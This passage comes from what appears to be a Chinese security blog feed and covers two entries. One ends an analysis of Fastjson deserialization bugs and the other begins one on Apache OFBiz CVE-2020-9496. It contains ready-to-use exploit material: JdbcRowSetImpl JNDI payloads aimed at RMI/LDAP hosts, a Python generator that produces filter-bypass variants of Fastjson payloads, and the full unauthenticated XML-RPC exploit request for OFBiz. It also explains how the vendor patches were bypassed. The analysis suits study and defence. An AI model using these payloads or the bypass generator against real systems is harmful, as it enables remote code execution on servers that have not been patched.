class="type">int</span> <span class="variable">val</span> <span class="operator">=</span> Integer.parseInt(<span class="keyword">new</span> <span class="title class_">String</span>(<span class="keyword">new</span> <span class="title class_">char</span>[] &#123; c1, c2, c3, c4 &#125;), <span class="number">16</span>);</span><br><span class="line">    hash = <span class="number">31</span> * hash + val;</span><br><span class="line">    putChar((<span class="type">char</span>) val);</span><br><span class="line">    <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure><h4 id="智能匹配"><a href="#智能匹配" class="headerlink" title="智能匹配"></a>智能匹配</h4><p><font style="color:#000000;">对字段添加多个下划线或者减号，fastjson 1.2.36版本前，在com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer#smartMatch方法中，解析字段的key的时候，_和-会被自动清除，但是需要注意只能使用同一种。</font></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; key.length(); ++i) &#123;</span><br><span class="line">    <span class="type">char</span> <span class="variable">ch</span> <span class="operator">=</span> key.charAt(i);</span><br><span class="line">    <span class="keyword">if</span> (ch == <span class="string">&#x27;_&#x27;</span>) &#123;</span><br><span class="line">        snakeOrkebab = <span class="literal">true</span>;</span><br><span class="line">        key2 = key.replaceAll(<span class="string">&quot;_&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (ch == <span class="string">&#x27;-&#x27;</span>) &#123;</span><br><span class="line">        snakeOrkebab = <span class="literal">true</span>;</span><br><span class="line">        key2 = key.replaceAll(<span class="string">&quot;-&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><font style="color:#000000;">在fastjson 1.2.36版本后，JavaBeanDeserializer#smartMatch方法会调用TypeUtils#fnv1a_64_lower方法来进行处理，可以看到会自动去除_和-。除此以外，当key的前缀为is时，会自动去除is，同时TypeUtils#fnv1a_64_lower方法会忽略key的大小写。</font></p><p><img src="/2024/12/24/Cursory-Analysis-Of-Fastjson/1735043638422-3f98c53a-30eb-40cf-b9d6-32373daf4019.png"></p><p><img src="/2024/12/24/Cursory-Analysis-Of-Fastjson/1735043481307-64af2ec3-e6f1-4e51-b8f1-f7cb624cf857.png"></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="punctuation">,</span><span class="attr">&quot;isdata-So_urceName&quot;</span><span class="punctuation">:</span><span class="string">&quot;rmi://127.0.0.1:1099/Exploit&quot;</span><span class="punctuation">,</span><span class="attr">&quot;autoCommit&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p><font style="color:#000000;">下面是Longofo师傅写的一个小脚本，可以将基础Payload转出各种绕过的形态。</font></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">from</span> json <span class="keyword">import</span> JSONDecodeError</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">FastJsonPayload</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, base_payload</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            json.loads(base_payload)</span><br><span class="line">        <span class="keyword">except</span> JSONDecodeError <span class="keyword">as</span> ex:</span><br><span class="line">            <span class="keyword">raise</span> ex</span><br><span class="line">        <span class="variable language_">self</span>.base_payload = base_payload</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">gen_common</span>(<span class="params">self, payload, func</span>):</span><br><span class="line">        tmp_payload = json.loads(payload)</span><br><span class="line">        dct_objs = [tmp_payload]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> <span class="built_in">len</span>(dct_objs) &gt; <span class="number">0</span>:</span><br><span class="line">            tmp_objs = []</span><br><span class="line">            <span class="keyword">for</span> dct_obj <span class="keyword">in</span> dct_objs:</span><br><span class="line">                <span class="keyword">for</span> key <span class="keyword">in</span> dct_obj:</span><br><span class="line">                    <span class="keyword">if</span> key == <span class="string">&quot;@type&quot;</span>:</span><br><span class="line">                        dct_obj[key] = func(dct_obj[key])</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> <span class="built_in">type</span>(dct_obj[key]) == <span class="built_in">dict</span>:</span><br><span class="line">                        tmp_objs.append(dct_obj[key])</span><br><span class="line">            dct_objs = tmp_objs</span><br><span class="line">        <span class="keyword">return</span> json.dumps(tmp_payload)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 对@type的value增加L开头;结尾的payload</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">gen_payload1</span>(<span class="params">self, payload: <span class="built_in">str</span></span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">self</span>.gen_common(payload, <span class="keyword">lambda</span> v: <span class="string">&quot;L&quot;</span> + v + <span class="string">&quot;;&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 对@type的value增加LL开头;;结尾的payload</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">gen_payload2</span>(<span class="params">self, payload: <span class="built_in">str</span></span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">self</span>.gen_common(payload, <span class="keyword">lambda</span> v: <span class="string">&quot;LL&quot;</span> + v + <span class="string">&quot;;;&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 对@type的value进行\u</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">gen_payload3</span>(<span class="params">self, payload: <span class="built_in">str</span></span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">self</span>.gen_common(payload,</span><br><span class="line">                               <span class="keyword">lambda</span> v: <span class="string">&#x27;&#x27;</span>.join(<span class="string">&#x27;\\u&#123;:04x&#125;&#x27;</span>.<span class="built_in">format</span>(c) <span class="keyword">for</span> c <span class="keyword">in</span> v.encode())).replace(<span class="string">&quot;\\\\&quot;</span>, <span class="string">&quot;\\&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 对@type的value进行\x</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">gen_payload4</span>(<span class="params">self, payload: <span class="built_in">str</span></span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">self</span>.gen_common(payload,</span><br><span class="line">                               <span class="keyword">lambda</span> v: <span class="string">&#x27;&#x27;</span>.join(<span class="string">&#x27;\\x&#123;:02x&#125;&#x27;</span>.<span class="built_in">format</span>(c) <span class="keyword">for</span> c <span class="keyword">in</span> v.encode())).replace(<span class="string">&quot;\\\\&quot;</span>, <span class="string">&quot;\\&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 生成cache绕过payload</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">gen_payload5</span>(<span class="params">self, payload: <span class="built_in">str</span></span>):</span><br><span class="line">        cache_payload = &#123;</span><br><span class="line">            <span class="string">&quot;rand1&quot;</span>: &#123;</span><br><span class="line">                <span class="string">&quot;@type&quot;</span>: <span class="string">&quot;java.lang.Class&quot;</span>,</span><br><span class="line">                <span class="string">&quot;val&quot;</span>: <span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        cache_payload[<span class="string">&quot;rand2&quot;</span>] = json.loads(payload)</span><br><span class="line">        <span class="keyword">return</span> json.dumps(cache_payload)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">gen</span>(<span class="params">self</span>):</span><br><span class="line">        payloads = []</span><br><span class="line"></span><br><span class="line">        payload1 = <span class="variable language_">self</span>.gen_payload1(<span class="variable language_">self</span>.base_payload)</span><br><span class="line">        <span class="keyword">yield</span> payload1</span><br><span class="line"></span><br><span class="line">        payload2 = <span class="variable language_">self</span>.gen_payload2(<span class="variable language_">self</span>.base_payload)</span><br><span class="line">        <span class="keyword">yield</span> payload2</span><br><span class="line"></span><br><span class="line">        payload3 = <span class="variable language_">self</span>.gen_payload3(<span class="variable language_">self</span>.base_payload)</span><br><span class="line">        <span class="keyword">yield</span> payload3</span><br><span class="line"></span><br><span class="line">        payload4 = <span class="variable language_">self</span>.gen_payload4(<span class="variable language_">self</span>.base_payload)</span><br><span class="line">        <span class="keyword">yield</span> payload4</span><br><span class="line"></span><br><span class="line">        payload5 = <span class="variable language_">self</span>.gen_payload5(<span class="variable language_">self</span>.base_payload)</span><br><span class="line">        <span class="keyword">yield</span> payload5</span><br><span class="line"></span><br><span class="line">        payloads.append(payload1)</span><br><span class="line">        payloads.append(payload2)</span><br><span class="line">        payloads.append(payload5)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> payload <span class="keyword">in</span> payloads:</span><br><span class="line">            <span class="keyword">yield</span> <span class="variable language_">self</span>.gen_payload3(payload)</span><br><span class="line">            <span class="keyword">yield</span> <span class="variable language_">self</span>.gen_payload4(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    fjp = FastJsonPayload(<span class="string">&#x27;&#x27;&#x27;&#123;</span></span><br><span class="line"><span class="string">  &quot;rand1&quot;: &#123;</span></span><br><span class="line"><span class="string">    &quot;@type&quot;: &quot;com.sun.rowset.JdbcRowSetImpl&quot;,</span></span><br><span class="line"><span class="string">    &quot;dataSourceName&quot;: &quot;ldap://localhost:1389/Object&quot;,</span></span><br><span class="line"><span class="string">    &quot;autoCommit&quot;: true</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">&#125;&#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> payload <span class="keyword">in</span> fjp.gen():</span><br><span class="line">        <span class="built_in">print</span>(payload)</span><br><span class="line">        <span class="built_in">print</span>()</span><br></pre></td></tr></table></figure><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://su18.org/post/fastjson/">Fastjson：我一路向北，离开有你的季节</a></p><p><a href="https://github.com/knownsec/KCon/blob/master/2022/Hacking%20JSON%E3%80%90KCon2022%E3%80%91.pdf">KCon2022 Hacking JSON</a></p><p><a href="https://github.com/LeadroyaL/fastjson-blacklist">Fastjson Blacklist</a></p><p><a href="https://su18.org/post/fastjson-1.2.68/">Fastjson 68 commons-io AutoCloseable</a></p><p><a href="https://paper.seebug.org/1192/">Fastjson 反序列化漏洞史</a></p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> Fastjson </tag>
            
            <tag> 组件安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Cursory Analysis Of Apache OFBiz Vulnerability</title>
      <link href="/2024/12/18/Cursory-Analysis-Of-Apache-OFBiz/"/>
      <url>/2024/12/18/Cursory-Analysis-Of-Apache-OFBiz/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><font style="color:#000000;">Apache OFBiz（Open for Business Project）是一个非常强大的开源企业资源规划（ERP）和企业自动化软件。它提供了一整套业务应用程序组件，可以用于构建各种企业级的业务管理系统，包括但不限于客户关系管理（CRM）、供应链管理（SCM）、电子商务、财务管理、制造管理等多个业务领域。</font></p><p><font style="color:#000000;">由于其连续爆出多个由于权限问题所导致的漏洞，本文旨在分析部分相关漏洞，学习了解相关的漏洞成因及利用手法。Apache OFBiz具体的漏洞细节可以在其官网查看，</font><a href="https://ofbiz.apache.org/security.html">https://ofbiz.apache.org/security.html</a>。</p><h2 id="Pre-Auth"><a href="#Pre-Auth" class="headerlink" title="Pre Auth"></a>Pre Auth</h2><h3 id="CVE-2020-9496"><a href="#CVE-2020-9496" class="headerlink" title="CVE-2020-9496"></a>CVE-2020-9496</h3><p><font style="color:#000000;">Apache XML-RPC是Apache软件基金会下的一个开源项目，它为Java开发者提供了一个完整的XML-RPC实现框架，方便开发人员在Java环境中构建能够支持XML-RPC通信的客户端和服务器端应用程序。但在2010年前后，Apache XML-RPC基本上就不更新了，历史上出现过多个反序列化漏洞（如CVE-2016-5003、CVE-2019-17570），但都没有被修复。</font><strong><font style="color:#000000;">而Apache OFBiz由于使用了XML-RPC组件，因此导致了漏洞的存在。</font></strong></p><p><font style="color:#000000;">该漏洞的本质原因为Apache OFBiz使用了XML-RPC组件，从而导致其易受不安全反序列化的影响。漏洞入口点在&#x2F;webtools&#x2F;control&#x2F;xmlrpc，查看framework&#x2F;webtools&#x2F;webapp&#x2F;webtools&#x2F;WEB-INF&#x2F;web.xml，可以得知control路由由org.apache.ofbiz.webapp.control.ControlServlet进行处理。</font></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">description</span>&gt;</span>Main Control Servlet<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">display-name</span>&gt;</span>ControlServlet<span class="tag">&lt;/<span class="name">display-name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>ControlServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>org.apache.ofbiz.webapp.control.ControlServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">load-on-startup</span>&gt;</span>1<span class="tag">&lt;/<span class="name">load-on-startup</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>ControlServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/control/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure><p><font style="color:#000000;">跟进org.apache.ofbiz.webapp.control.ControlServlet#doGet方法，先获取RequestHandler。</font></p><p><img src="/2024/12/18/Cursory-Analysis-Of-Apache-OFBiz/1734343393268-bd8387da-0da6-43b9-b68c-03a711afcb85.png"></p><p><font style="color:#000000;">接着尝试从ServletContext中获取一个名为_REQUEST_HANDLER_的属性，可以看到读取了framework&#x2F;webtools&#x2F;webapp&#x2F;webtools&#x2F;WEB-INF&#x2F;controller.xml文件。</font></p><p><img src="/2024/12/18/Cursory-Analysis-Of-Apache-OFBiz/1734343542744-5cd43174-f94e-43ea-bca0-af34c41f0848.png"></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">request-map</span> <span class="attr">uri</span>=<span class="string">&quot;xmlrpc&quot;</span> <span class="attr">track-serverhit</span>=<span class="string">&quot;false&quot;</span> <span class="attr">track-visit</span>=<span class="string">&quot;false&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">security</span> <span class="attr">https</span>=<span class="string">&quot;false&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">event</span> <span class="attr">type</span>=<span class="string">&quot;xmlrpc&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">response</span> <span class="attr">name</span>=<span class="string">&quot;error&quot;</span> <span class="attr">type</span>=<span class="string">&quot;none&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">response</span> <span class="attr">name</span>=<span class="string">&quot;success&quot;</span> <span class="attr">type</span>=<span class="string">&quot;none&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">request-map</span>&gt;</span></span><br></pre></td></tr></table></figure><p><font style="color:#000000;">可以看到对于xmlrpc路由，其security的值为false，即无需鉴权即可访问，接着进行一系列请求处理后调用org.apache.ofbiz.webapp.control.RequestHandler#doRequest方法来处理请求。</font></p><p><img src="/2024/12/18/Cursory-Analysis-Of-Apache-OFBiz/1734344116974-6f8165fb-0f26-4dc1-87b4-bde9d21a3432.png"></p><p><font style="color:#000000;">接着从framework&#x2F;webtools&#x2F;webapp&#x2F;webtools&#x2F;WEB-INF&#x2F;controller.xml文件获取控制器配置信息。然后匹配访问的路由。</font></p><p><img src="/2024/12/18/Cursory-Analysis-Of-Apache-OFBiz/1734344604373-0d66790a-a988-4d9a-aec1-1b5f46afc459.png"></p><p><img src="/2024/12/18/Cursory-Analysis-Of-Apache-OFBiz/1734344657244-cdc5862f-66a6-4018-b492-29e167aae188.png"></p><p><font style="color:#000000;">接着调用到org.apache.ofbiz.webapp.control.RequestHandler#runEvent方法，根据event的类型，在工厂类中获取对应的EventHandler并执行其invoke方法。</font></p><p><img src="/2024/12/18/Cursory-Analysis-Of-Apache-OFBiz/1734344797184-391c8d08-6c14-4d64-a712-650e19f42d20.png"></p><p><img src="/2024/12/18/Cursory-Analysis-Of-Apache-OFBiz/1734358989249-dd7b23a0-2bb5-45b6-a7e4-537ec4f897c1.png"></p><p><font style="color:#000000;">xmlrpc路由对应的EventHandler是XmlRpcEventHandler类，跟进org.apache.ofbiz.webapp.event.XmlRpcEventHandler#invoke方法，当请求中缺乏echo参数时进入else语句，调用org.apache.ofbiz.webapp.event.XmlRpcEventHandler#execute方法。</font></p><p><img src="/2024/12/18/Cursory-Analysis-Of-Apache-OFBiz/1734359084239-f499944f-9769-42cf-b528-cccc49f17272.png"></p><p><font style="color:#000000;">在org.apache.ofbiz.webapp.event.XmlRpcEventHandler#execute方法中，传入获取的XML-RPC配置和创建的HttpStreamConnection对象，执行XML-RPC调用。</font></p><p><img src="/2024/12/18/Cursory-Analysis-Of-Apache-OFBiz/1734359495453-1a557511-5da2-448e-9639-ab80896af324.png"></p><p><font style="color:#000000;">跟进org.apache.ofbiz.webapp.event.XmlRpcEventHandler#getRequest方法，创建一个XmlRpcRequestParser对象，用于解析XML-RPC请求，使用SAXParsers#newXMLReader实例化一个新的XMLReader对象，接着利用XMLReader解析输入流中的XML数据。</font></p><p><img src="/2024/12/18/Cursory-Analysis-Of-Apache-OFBiz/1734359775777-30445024-4d78-4220-8f95-ff577bda34c8.png"></p><p><font style="color:#000000;">继续跟进XmlRpcRequestParser，此时对输入流中的XML进行解析，包括startElement方法、endElement方法等，在startElement方法中会调用父类org.apache.xmlrpc.parser.RecursiveTypeParserImpl的startElement方法。</font></p><p><img src="/2024/12/18/Cursory-Analysis-Of-Apache-OFBiz/1734420782428-a19209f5-7670-4d37-a2a6-05fcf2f11975.png"></p><p>在<font style="color:#000000;">org.apache.xmlrpc.parser.RecursiveTypeParserImpl#startElement方法中，扫描XML的标签的时候会调用getParser方法获取对应标签的parser。</font></p><p><img src="/2024/12/18/Cursory-Analysis-Of-Apache-OFBiz/1734361621727-87345e9c-6a2f-4d1d-87f5-379fd6302ac5.png"></p><p><font style="color:#000000;">当标签为serializable时会调用解析器SerializableParser，其父类是ByteArrayParser，先进行一次Base64解码，然后在SerializerParser#getResult方法中会触发反序列化。</font></p><p><img src="/2024/12/18/Cursory-Analysis-Of-Apache-OFBiz/1734362755803-f50f0527-bf51-4229-938c-afb80219f409.png"></p><p><img src="/2024/12/18/Cursory-Analysis-Of-Apache-OFBiz/1734362215394-a251a14e-e085-4669-af81-1ff3392e0bdd.png"></p><p><img src="/2024/12/18/Cursory-Analysis-Of-Apache-OFBiz/1734362467223-70d20ed6-caae-4a1b-8396-bef28a989fb2.png"></p><p><font style="color:#000000;">需要注意的是，XmlRpcRequestParser的对于XML的解析中，处理过程是按照methodCall，methodName，params，param的顺序遍历标签进行的，当扫描完4个必须提供的标签后，才会调用父类的startElement方法进行处理，而typeParser就是在父类中完成赋值的，随后通过不同的解析器进入不同的解析流程。</font></p><p><font style="color:#000000;">因此，最后default中的解析是从value节点内开始的，而直接传入searializable标签是不存在getResult方法触发的，这里利用struct标签进行一层嵌套。</font></p><p><img src="/2024/12/18/Cursory-Analysis-Of-Apache-OFBiz/1734363080490-be8e8158-3ee6-4eb9-80c9-5daa4b544c02.png"></p><p><img src="/2024/12/18/Cursory-Analysis-Of-Apache-OFBiz/1734363154733-7d9b70ea-2e0d-4db9-9f7a-46827640abf7.png"></p><p>漏洞利用数据包如下：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/webtools/control/xmlrpc</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1:8443</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/xml</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36</span><br><span class="line"></span><br><span class="line"><span class="language-handlebars"><span class="language-xml"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"><span class="tag">&lt;<span class="name">methodCall</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"><span class="tag">&lt;<span class="name">methodName</span>&gt;</span></span><span class="template-variable">&#123;&#123;<span class="name">Random_String</span>&#125;&#125;</span><span class="language-xml"><span class="tag">&lt;/<span class="name">methodName</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"><span class="tag">&lt;<span class="name">params</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">    <span class="tag">&lt;<span class="name">param</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">    <span class="tag">&lt;<span class="name">value</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">        <span class="tag">&lt;<span class="name">struct</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">        <span class="tag">&lt;<span class="name">member</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">            <span class="tag">&lt;<span class="name">name</span>&gt;</span></span><span class="template-variable">&#123;&#123;<span class="name">Random_String</span>&#125;&#125;</span><span class="language-xml"><span class="tag">&lt;/<span class="name">name</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">            <span class="tag">&lt;<span class="name">value</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">            <span class="tag">&lt;<span class="name">serializable</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://ws.apache.org/xmlrpc/namespaces/extensions&quot;</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">           </span><span class="template-variable">&#123;&#123;<span class="name">Base64_Payload</span>&#125;&#125;</span><span class="language-xml"></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">            <span class="tag">&lt;/<span class="name">serializable</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">            <span class="tag">&lt;/<span class="name">value</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">        <span class="tag">&lt;/<span class="name">member</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">        <span class="tag">&lt;/<span class="name">struct</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">    <span class="tag">&lt;/<span class="name">value</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">    <span class="tag">&lt;/<span class="name">param</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"><span class="tag">&lt;/<span class="name">params</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"><span class="tag">&lt;/<span class="name">methodCall</span>&gt;</span></span></span></span><br></pre></td></tr></table></figure><p><img src="/2024/12/18/Cursory-Analysis-Of-Apache-OFBiz/1734363405198-e9396643-7834-4ea4-9a77-2edb89417858.png"></p><p><font style="color:#000000;">官方第一次提交的修复补丁</font><a href="https://github.com/apache/ofbiz-framework/commit/4bdfb54ffb6e05215dd826ca2902c3e31420287a"><font style="color:#000000;">https://github.com/apache/ofbiz-framework/commit/4bdfb54ffb6e05215dd826ca2902c3e31420287a</font></a><font style="color:#000000;">，此次补丁的主要作用是为XML-RPC的接口进行鉴权。</font></p><p><font style="color:#000000;">但是这种修复方式治标不治本，攻击者依旧可以实现Post-Auth攻击，因此官方进行了二次补丁，此次增加了关键词</serializable>的检测。但是这样就安全了嘛？很明显，可以利用增加空格的方式来进行绕过，因此官方又进行了一次补丁</font><a href="https://github.com/apache/ofbiz-framework/commit/25293e4cf6f334a2ae33b3041acba45113dddce9"><font style="color:#000000;">https://github.com/apache/ofbiz-framework/commit/25293e4cf6f334a2ae33b3041acba45113dddce9</font></a><font style="color:#000000;">，通过检测&lt;&#x2F;serializable关键词来进行防御。</font></p><h3 id="CVE-2021-26295"><a href="#CVE-2021-26295" class="headerlink" title="CVE-2021-26295"></a><font style="color:rgb(0, 0, 0);">CVE-2021-26295</font></h3><p><font style="color:#000000;">在上文分析CVE-2020-9496时，在controller.xml文件中还存在另一个路由SOAPService，其鉴权也是缺失的。</font></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">request-map</span> <span class="attr">uri</span>=<span class="string">&quot;SOAPService&quot;</span>&gt;</span></span><br><span 